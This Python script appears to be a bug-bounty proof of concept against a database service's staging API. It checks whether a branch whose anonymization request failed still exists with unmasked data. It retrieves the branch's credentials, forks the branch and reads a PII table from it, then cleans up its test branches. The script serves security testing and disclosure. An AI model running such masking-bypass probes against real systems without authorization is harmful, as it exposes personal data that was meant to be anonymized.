# -*- coding: utf-8 -*-
"""ANGLE-6: ghost branch after API-400 branch_anonymized (column validation).
Hypothesis: API validates masking rule AFTER branch creation -> 400 returned,
but branch persists (caller believes create failed -> never deletes).
Ghost branch = locked (RA) + original data + forkable.
Also cleanup leftovers from u11/u12 runs (delete endpoints first if needed).
"""
import json
import time
import ssl
import http.client
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _pg import connect, query

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
LOG = r"F:\scan\neon_report\_u15_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    APIKEY = json.load(fh)["key"]


def call(method, path, body=None, timeout=60):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + APIKEY)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def pw_of(bid):
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, bid))
    if st != 200:
        return None
    from urllib.parse import urlsplit
    u = urlsplit(json.loads(d)["uri"])
    return u.hostname, u.username, u.password


GHOST = "br-ancient-flower-w2lv7sx3"

# ---- 1. ghost branch forensics ----
st, d = call("GET", "/projects/%s/branches/%s" % (PA, GHOST))
out("GHOST GET branch: %s %s" % (st, d[:700]))
try:
    b = json.loads(d)["branch"]
    out("  name=%s state=%s ra=%s parent_id=%s" % (
        b.get("name"), b.get("current_state"),
        b.get("restricted_actions"), b.get("parent_id")))
except Exception as e:
    out("  parse err %s" % e)

st, d = call("GET", "/projects/%s/branches/%s/anonymized_status" % (PA, GHOST))
out("GHOST anon_status: %s %s" % (st, d[:400]))

hp = pw_of(GHOST)
out("GHOST pw_of: %s" % ("ok" if hp else "fail"))
if hp:
    for i in range(5):
        try:
            c = connect(*hp)
            rows = query(c, "select table_name from information_schema.tables where table_schema='public'")
            out("GHOST dataplane CONNECTED (schema): %s" % repr(rows)[:400])
            c.close()
            break
        except Exception as e:
            out("GHOST dataplane try %d: %s" % (i, str(e)[:110]))
            time.sleep(4)

# fork the ghost (current state)
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u15-ghostfork", "parent_id": GHOST},
              "endpoints": [{"type": "read_write"}]})
out("GHOST fork: %s %s" % (st, d[:300]))
if st in (200, 201):
    FK = json.loads(d)["branch"]["id"]
    out("GHOST fork ra=%s" % json.loads(d)["branch"].get("restricted_actions"))
    time.sleep(3)
    hpf = pw_of(FK)
    for i in range(15):
        try:
            c = connect(*hpf)
            rows = query(c, "select * from u11_pii")
            out("GHOST-fork data: %s" % repr(rows)[:400])
            c.close()
            break
        except Exception as e:
            out("GHOST-fork try %d: %s" % (i, str(e)[:100]))
            time.sleep(5)
    call("DELETE", "/projects/%s/branches/%s" % (PA, FK))
    out("cleaned u15-ghostfork")

# ---- 2. cleanup all leftovers (u11/u12/u15) ----
st, d = call("GET", "/projects/%s/branches" % PA)
for b in json.loads(d).get("branches", []):
    nm = b.get("name", "")
    if nm.startswith(("u11-", "u12-", "u15-")):
        bid = b["id"]
        # try delete endpoints first to avoid branch delete issues
        st2, d2 = call("GET", "/projects/%s/branches/%s/endpoints" % (PA, bid))
        try:
            for e in json.loads(d2).get("endpoints", []):
                call("DELETE", "/projects/%s/endpoints/%s" % (PA, e["id"]))
        except Exception:
            pass
        st3, d3 = call("DELETE", "/projects/%s/branches/%s" % (PA, bid))
        out("cleanup %s (%s): %s %s" % (nm, bid, st3, d3[:150]))
        time.sleep(1)

# final check
st, d = call("GET", "/projects/%s/branches" % PA)
out("FINAL branches:")
for b in json.loads(d).get("branches", []):
    out("  %-30s %s" % (b.get("name"), b.get("id")))
print("== DONE", flush=True)
